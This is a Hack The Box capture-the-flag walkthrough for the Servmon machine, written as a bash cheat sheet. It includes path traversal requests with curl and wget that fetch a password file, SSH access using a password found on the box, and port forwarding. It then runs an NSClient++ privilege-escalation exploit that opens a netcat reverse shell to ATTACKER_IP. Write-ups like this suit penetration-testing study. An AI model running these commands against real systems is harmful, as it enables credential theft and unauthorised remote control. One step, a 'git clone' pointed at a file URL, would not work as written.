# HTB: [Servmon](https://www.hackthebox.com/machines/Servmon) 
# Walkthrough: https://youtu.be/L576cQ3mQU4

```bash
#############################################
# 0️⃣ Files & assets
#############################################
# Provided / discovered:
# - web server (port 80) vulnerable to path traversal (NVMS-1000)
# - hint file (port 21): Users/Nathan/Desktop/Passwords.txt 

#############################################
# 1️⃣ FTP / HTTP: retrieve hint files (path traversal)
#############################################
# Example raw GETs observed from NVMS-1000 path traversal
# GET /../../../../../../../../../../../../windows/win.ini
# GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt

# Use curl to reproduce path traversal (replace $IP) or through burp
curl -s "http://$IP/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" -o Passwords.txt
# or
wget -qO Passwords.txt "http://$IP/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt"

#############################################
# 2️⃣ Credentials & notes
#############################################
# sprayed with Nadine, got the pass.
# NSClient password found on box: Nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
# Current password: abc

#############################################
# 3️⃣ SSH: initial access
#############################################
# SSH worked for Nadine
ssh Nadine@$IP

# If web UI on 8443 is localhost-only, confirm nsclient.ini
type nscleint.ini
#############################################
# 4️⃣ Local port forwarding to reach NSClient web UI
#############################################
# Create SSH tunnels to forward remote 127.0.0.1:8443 to local 8443
ssh -L 8443:127.0.0.1:8443 -L 1234:localhost:8080 Nadine@$IP -N

# On attacker machine, verify:
curl -vk https://127.0.0.1:8443/

#############################################
# 5️⃣ Transfer netcat to target
#############################################
# From attacker:
scp nc.exe Nadine@$IP:"C:\Users\Nadine\nc.exe"

#############################################
# 6️⃣ Pull exploit and run
#############################################
# Clone or fetch exploit (example repo)
git clone https://github.com/strikoder/custom_pentest_scripts/blob/main/CVES/NSClient-0.5.2.35-Privilege-Escalation(EDB-46802).py

# Start listener on attacker:
nc -lvnp 1337

# Run exploit from attacker with command that will execute nc on target.
# Replace ATTACKER_IP, 1337, and PASSWORD with real values.
python3 NSClient-0.5.2.35-Privilege-Escalation\(EDB-46802\).py "C:\Users\Nadine\nc.exe ATTACKER_IP 1337 -e cmd.exe" https://127.0.0.1:8443 abc
```
